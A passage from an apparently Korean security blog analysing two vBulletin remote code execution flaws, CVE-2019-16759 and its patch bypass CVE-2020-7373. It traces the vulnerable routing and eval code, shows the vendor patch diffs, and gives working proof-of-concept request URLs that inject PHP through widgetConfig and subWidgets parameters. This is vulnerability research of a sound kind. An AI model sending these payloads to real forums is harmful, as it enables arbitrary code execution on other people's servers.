class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;actionRender&#x27;</span>, <span class="string">&#x27;arguments&#x27;</span> =&gt; <span class="variable">$params</span>,</span><br><span class="line">            <span class="string">&#x27;template&#x27;</span> =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>));</span><br><span class="line">        Api_InterfaceAbstract::setLight();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$params</span>));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>callRender 메서드를 보면 $routeInfo에 explode() 메서드를 이용해서 <code>$_REQUEST[&#39;routestring&#39;]</code>의 값을 슬래쉬를 기준으로 잘라 배열로 만들어주고, $params에는 array_merge 메서드를 이용해서 Query String 값과 Raw Data 값을 합쳐 하나의 배열로 만드는 것을 볼 수 있습니다.</strong><br></p><p><strong>그리고 $routeInfo[2]의 값과 $params의 값을 템플릿으로 전송하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// core/install/vbulletin-style.xml</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_php&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1372889589&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin Solutions&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.0.5 Release Canddate 1&quot;</span>&gt;</span>&lt;![CDATA[&lt;</span><br><span class="line">        vb:if condition=&quot;empty(widgetConfig) AND !empty($widgetinstaceid)&quot;&gt;</span><br><span class="line">    &#123;vb:data widgetConfig, widget, fetchConfig, (vb:raw widgetinstanceid)&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line">&lt;vb:if condition=&quot;!empty($widgetConfig)&quot;&gt;</span><br><span class="line">    &#123;vb:set widgetid, &#123;vb:raw widgetConfig.widgetid&#125;&#125;</span><br><span class="line">    &#123;vb:set widgetinstanceid, &#123;vb:raw widgetConfig.widgetinstanceid&#125;&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;canvax-widget default-widget custtom-html-widget&quot; data-widget-id=&quot;&#123;vb:raw widgetid&#125;&quot; data-widget-instance-id=&quot;&#123;vb:raw widgetinstanceid&#125;&quot;&gt;</span><br><span class="line">    &#123;vb:template module_title, widgetConfig=&#123;vb:raw widgetConfig&#125;, can_use_sitebuilder=&#123;vb:raw user.can_use_sitebuilder&#125;&#125;</span><br><span class="line">    &lt;div class=&quot;widget-header-divder&quot; /&gt;</span><br><span class="line">        &lt;hr class=&quot;widget-header-divider&quot; /&gt;</span><br><span class="line">        &lt;vb:if condition=&quot;!empty($widgetConfig[&#x27;code&#x27;]) AND !$vboptions[&#x27;disable_php_rendering&#x27;]&quot;&gt;</span><br><span class="line">            &#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">            &#123;vb:raw $evaledPHP&#125;</span><br><span class="line">        &lt;vb:else /&gt;</span><br><span class="line">            &lt;vb:if condition=&quot;$user[can_use_sitebuilder&#x27;]&quot;&gt;</span><br><span class="line">                &lt;span class=&quot;note&quot;&gt;&#123;vb:phrase click_edit_to_config_module&#125;&lt;/span&gt;</span><br><span class="line">            &lt;/vb:if&gt;</span><br><span class="line">        &lt;/vb:if&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>widget_php 템플릿을 확인해보면 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 비어있지 않고, <code>!$vboptions[&#39;disable_php_rendering&#39;]</code>가 비활성화 되어 있으면 다음 코드를 코드를 실행하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">&#123;vb:raw $evaledPHP&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/controller/bbcode.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evalCode</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>evalCode 메서드는 <code>includes/vb5/frontend/controller/bbcode.php</code> 내에 정의하고 있고, eval 함수를 이용해서 $code 값을 실행시키고, <code>$output</code> 값을 리턴해주는 것을 볼 수 있습니다.</strong><br><br></p><p><strong>결론적으로 RCE를 트리거 하기 위해서는 <code>includes/vb5/frontend/applicationlight.php</code>에서 <code>isQuickRoute</code> 메서드에서 rotuestring의 값이 ‘ajax/render’여야 하고, callRender에서 $routeInfo[2]의 값은 <code>&#39;widget_php&#39;</code>여야 하고, <code>widget_php</code> 템플릿에서는 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 존재해야 하고, eval 함수의 인자 값으로도 <code>$widgetConfig[&#39;code&#39;]</code>가 들어갑니다.</strong><br><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line"><span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">print_r(<span class="variable">$routeInfo</span>);</span><br><span class="line">print_r(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">input  : http:<span class="comment">//141.164.52.207/?routestring=ajax/render/widget_php&amp;widgetConfig[&#x27;code&#x27;]=phpinfo();</span></span><br><span class="line">output : <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; ajax [<span class="number">1</span>] =&gt; render [<span class="number">2</span>] =&gt; widget_php ) <span class="keyword">Array</span> ( [routestring] =&gt; ajax/render/widget_php [widgetConfig] =&gt; <span class="keyword">Array</span> ( [<span class="string">&#x27;code&#x27;</span>] =&gt; phpinfo(); ) )</span><br></pre></td></tr></table></figure><p><strong>그리고 사용자 값을 받을 때, $_REQUEST를 이용해서 받아 오기 때문에 GET, POST 메서드를 이용해서 공격을 수행할 수 있습니다. 그러니 GET으로 익스를 하려면 위와 같이 그냥 값을 넘겨 주게 되면 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 참이 반환되는 동시에 vB5_Frontend_ApplicationLight::init가 실행 돼 __construct 메서드가 실행이 될 것이고, __construct 메서드에서도 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 handler를 callRender로 설정하게 됩니다. callRender 메서드에서는 routeInfo[2]의 값으로는 <code>&#39;widget_php&#39;</code>, widgetConfig[‘code’]의 값으로는 <code>&#39;phpinfo();&#39;</code>가 들어가 있어 2개의  widget_php 템플릿으로 전송이 됩니다. widget_php에서는 widgetConfig[‘code’]가 비어있지 않기 때문에 evalCode로 widgetConfig[‘code’]가 전송이 되어 phpinfo(); 함수가 실행이 되며 RCE가 성공적으로 트리거 되게 됩니다.</strong><br><br></p><hr><h2 id="CVE-2019-16759-Patch"><a href="#CVE-2019-16759-Patch" class="headerlink" title="CVE-2019-16759 Patch"></a><em>CVE-2019-16759 Patch</em></h2><p><strong>CVE-2019-16759 취약점은 총 2개의 패치가 이루어졌다고 합니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      Remove any problematic values from the template</span></span><br><span class="line"><span class="comment"> *      variable arrays before rendering</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//for now don&#x27;t pass the values through.  These arrays are potentially large</span></span><br><span class="line"><span class="comment">//and we don&#x27;t want to make unnecesary copies.  The alternative is to pass by</span></span><br><span class="line"><span class="comment">//reference which causes it&#x27;s own headaches.  It&#x27;s an internal function and the</span></span><br><span class="line"><span class="comment">//relevant arrays are all class variables.</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanRegistered</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">        <span class="variable">$disallowedNames</span> = <span class="keyword">array</span>(<span class="string">&#x27;widgetConfig&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$disallowedNames</span> <span class="keyword">AS</span> <span class="variable">$name</span>)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;registered[<span class="variable">$name</span>]);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="built_in">self</span>::<span class="variable">$globalRegistered</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>첫  패치는 <code>clearRegistered</code>라는 함수를 이용해서 widgetConfig라는 값이 사용되면 <code>unset()</code> 함수를 이용해서 제거하고 있습니다. 그러니 Query String 이나 Raw Data로 <code>widgetConfig[&#39;code&#39;]=phpinfo();</code>라는 값이 들어오게 되면 widgetConfig가 존재하기 때문에 <code>unset()</code>에 의해서 제거가 될 것 입니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.356918994</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.577517014</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-286</span>,<span class="number">20</span> +<span class="number">286</span>,<span class="number">32</span> @@</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;render&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">-<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">-<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">-<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">-<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>],</span><br><span class="line">-<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">-<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">-<span class="comment">// not sending the data to the template</span></span><br><span class="line">-<span class="comment">// render</span></span><br><span class="line">-<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">-));</span><br><span class="line">-Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$templateName</span> = <span class="variable">$routeInfo</span>[<span class="number">2</span>];</span><br><span class="line">+<span class="keyword">if</span> (<span class="variable">$templateName</span> == <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;css_links&#x27;</span> =&gt; <span class="keyword">array</span>(),</span><br><span class="line">+);</span><br><span class="line">+&#125;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$templateName</span>,</span><br><span class="line">+<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">+<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">+<span class="comment">// not sending the data to the template</span></span><br><span class="line">+<span class="comment">// render</span></span><br><span class="line">+<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">+));</span><br><span class="line">+Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$result</span> = vB5_Template::staticRenderAjax(<span class="variable">$templateName</span>, <span class="variable">$serverData</span>);</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$serverData</span>));</span><br><span class="line">+<span class="keyword">$this</span>-&gt;sendAsJson(<span class="variable">$result</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br></pre></td></tr></table></figure><p><strong>그리고 두 번째 패치는 <code>$routeInfo[2]</code>(Template Name)의 값으로 <code>widget_php</code>가 들어오게 되면 빈 템플릿과 CSS를 반환하도록 하는 조건문을 추가함으로 0-day에 대응하게 되었습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.276913797</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/template/runtime.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.493511575</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-12</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">26</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">vB5_Template_Runtime</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">+<span class="comment">//This is intended to allow the runtime to know that template it is rendering.</span></span><br><span class="line">+<span class="comment">//It&#x27;s ugly and shouldn&#x27;t be used lightly, but making some features widely</span></span><br><span class="line">+<span class="comment">//available to all templates is uglier.</span></span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$templates</span> = <span class="keyword">array</span>();</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">startTemplate</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_push(<span class="built_in">self</span>::<span class="variable">$templates</span>, <span class="variable">$template</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">endTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+array_pop(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">currentTemplate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="keyword">return</span> end(<span class="built_in">self</span>::<span class="variable">$templates</span>);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$units</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;px&#x27;</span>,</span><br><span class="line">@@ <span class="number">-1944</span>,<span class="number">6</span> +<span class="number">1964</span>,<span class="number">21</span> @@</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&#x27;&lt;div style=&quot;border:1px solid red;padding:10px;margin:10px;&quot;&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$timerName</span>) . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$elapsed</span> . <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalPhp</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="comment">//only allow the PHP widget template to do this.  This prevents a malicious user</span></span><br><span class="line">+<span class="comment">//from hacking something into a different template.</span></span><br><span class="line">+<span class="keyword">if</span> (<span class="built_in">self</span>::currentTemplate() != <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">+&#125;</span><br><span class="line">+ob_start();</span><br><span class="line">+<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">+<span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">+ob_end_clean();</span><br><span class="line">+<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">+&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>또한 evalPhP 메서드의 현재 템플릿이 widget_php가 아니면 Null을 반환하도록 하는 조건문을 추가해서, 다른 템플릿에서 악용될 요소도 제거하는 것을 볼 수 있습니다. (Line 342 ~ 345)</strong><br></p><p><strong>이와 같이 총 2곳을 패치해서 0-day 취약점을 제거했지만 약 1년 정도가 지나고 한 보안 연구원에 의해서 우회가 돼 0-day가 다시 나오게 되었습니다.</strong><br></p><hr><h2 id="CVE-2020-7373"><a href="#CVE-2020-7373" class="headerlink" title="CVE-2020-7373"></a><em>CVE-2020-7373</em></h2><p><strong><code>CVE-2020-7373</code>은 <code>CVE-2019-16759</code>를 패치한 것을 우회해 다시 RCE 취약점을 트리거 한 0-day 입니다. 해당 취약점은 본례의 익스 방식과 크게 다를 게 없지만 다르다면 템플릿을 <code>widget_php</code>가 아닌 <code>widget_tabbedcontainer_tab_panel</code>이라는 템플릿을 이용해서 익스를 진행하였습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_tabbedcontainer_tab_panel&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1532130449&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.4.4 Alpha 2&quot;</span>&gt;</span>&lt;![CDATA[&#123;vb:set panel_id, &#123;vb:concat &#123;vb:var id_prefix&#125;, &#123;vb:var tab_num&#125;&#125;&#125;</span><br><span class="line">&lt;div id=&quot;&#123;vb:var panel_id&#125;&quot; class=&quot;h-clearfix js-show-on-tabs-create h-hide&quot;&gt;</span><br><span class="line">&lt;vb:comment&gt;</span><br><span class="line">- &#123;vb:var panel_id&#125; </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;-- &#123;vb:raw subWidget.template&#125;</span><br><span class="line">&lt;/vb:each&gt;</span><br><span class="line">&lt;/vb:comment&gt;</span><br><span class="line"> </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&#123;vb:template &#123;vb:raw subWidget.template&#125;, </span><br><span class="line">widgetConfig=&#123;vb:raw subWidget.config&#125;, </span><br><span class="line">widgetinstanceid=&#123;vb:raw subWidget.widgetinstanceid&#125;,</span><br><span class="line">widgettitle=&#123;vb:raw subWidget.title&#125;, </span><br><span class="line">tabbedContainerSubModules=&#123;vb:raw subWidget.tabbedContainerSubModules&#125;,</span><br><span class="line">product=&#123;vb:raw subWidget.product&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/vb:each&gt; </span><br><span class="line">&lt;/div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>widget_tabbedcontainer_tab_panel</code> 템플릿은 자식 템플릿을 생성해주는 템플릿이라고 합니다. 하단의 보면 subWidget.template를 이용해서 템플릿 이름을 정하고, {vb:raw subWidget.config}를 이용해서 widgetConfig에 값을 넣어주는 것을 볼 수 있습니다.</strong><br><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC : http:&#x2F;&#x2F;141.164.52.207&#x2F;?subWidgets[0][template]&#x3D;widget_php&amp;subWidgets[0][config][code]&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><strong>그러니 위와 같이 subWidget.template의 값으로 <code>widget_php</code>, subWidget.config의 값으로 <code>code:phpinfo();</code>로 넘겨주면 template의 값은 <code>widget_php</code>, widgetConfig.code의 값은 <code>phpinfo();</code>가 될 것 이고, widget_php 템플릿이 생성되면 widgetConfig[‘code’]의 값은 <code>phpinfo();</code>이므로 <code>widget_php</code>에서 <code>CVE-2019-16759</code>와 동일하게 RCE가 트리거 되게 됩니다.</strong><br></p><hr><h2 id="CVE-2020-7373-Patch"><a href="#CVE-2020-7373-Patch" class="headerlink" title="CVE-2020-7373 Patch"></a><em>CVE-2020-7373 Patch</em></h2><p><strong>패치 코드가 안 보임</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> 0-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 0-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 회고와 2021 계획</title>
      <link href="2021/01/18/2021-01-18-new-year/"/>
      <url>2021/01/18/2021-01-18-new-year/</url>
      
